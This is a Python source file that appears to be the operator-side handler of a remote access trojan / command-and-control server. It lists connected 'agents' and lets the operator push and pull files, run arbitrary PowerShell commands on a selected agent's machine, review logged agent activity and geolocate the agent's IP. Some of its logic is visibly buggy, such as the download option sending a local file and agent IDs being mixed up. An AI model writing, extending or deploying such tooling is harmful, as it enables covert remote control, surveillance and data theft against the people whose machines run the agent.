from Geolocation import print_geolocation_details, get_geolocation
from Logs import online_agents, track_agent_activity, view_online_agents, view_agent_activities, update_online_agents


def handle_agent(client_socket, client_address):
    agent_id = client_socket.recv(4096).decode('utf-8')
    agent_ip = client_socket.recv(4096).decode('utf-8')
    update_online_agents(agent_id)

    while True:
        print("\nConnected Agents:")
        # Display connected agents
        index = 1
        for agent_id, agent_info in online_agents.items():
            print(f"[{index}]: Agent {agent_id}")
            index += 1

        agent_choice = input(
            "Enter the number of the Agent to perform actions (type 'list' to refresh agents, 'exit' to quit): ")

        if agent_choice.lower() == 'exit':
            break
        elif agent_choice.lower() == 'list':
            continue

        try:
            selected_index = int(agent_choice)
            if 1 <= selected_index <= len(online_agents):
                selected_agent = list(online_agents.keys())[selected_index - 1]
                client_socket.send(selected_agent.encode('utf-8'))
            else:
                print("Invalid Agent number. Please select a valid Agent.")
                continue
        except ValueError:
            print("Invalid input. Please enter a number.")

        while True:
            choice = input(
                "Enter your choice (1: Download File, 2: Access PowerShell, 3: Upload File, "
                "4: View Online Agents, 5: View Agent Activities, 6: Location Details, exit: Exit): ")

            if choice == '1':
                file_path = input("Enter the file path to download from the client (type 'exit' to return to choice "
                                  "options): ").replace('"', '')

                if file_path.lower() == 'exit':
                    break

                with open(file_path, 'rb') as file:
                    file_data = file.read()
                client_socket.send(f"get {file_path}".encode('utf-8'))
                client_socket.send(file_data)
                track_agent_activity(agent_id, f"Uploaded file: {file_path}")

            elif choice == '2':
                while True:
                    command = input(
                        "Enter command to execute on the client (type 'exit' to return to choice selection): ").replace(
                        '"', '')
                    if command.lower() == 'exit':
                        break
                    client_socket.send(command.encode('utf-8'))
                    output = client_socket.recv(4096).decode('utf-8')
                    print(output)
                    track_agent_activity(selected_agent, f"Executed command: {command}")
            elif choice == '3':
                file_path = input(
                    "Enter the full path of the file to upload (type 'exit' to return to choice options): ").replace(
                    '"', '')
                if file_path.lower() == 'exit':
                    break
                with open(file_path, 'rb') as file:
                    file_data = file.read()
                client_socket.send(f"send {file_path}".encode('utf-8'))
                client_socket.send(file_data)
                track_agent_activity(agent_id, f"Uploaded file: {file_path}")
            elif choice == '4':
                view_online_agents()
            elif choice == '5':
                view_agent_activities(selected_agent)
            elif choice == '6':
                # Retrieve geolocation information
                geolocation_data = get_geolocation(agent_ip)
                print_geolocation_details(geolocation_data)
            elif choice.lower() == 'exit':
                client_socket.send(choice.encode('utf-8'))
                break
            else:
                print("Invalid choice. Please try again.")

    client_socket.close()
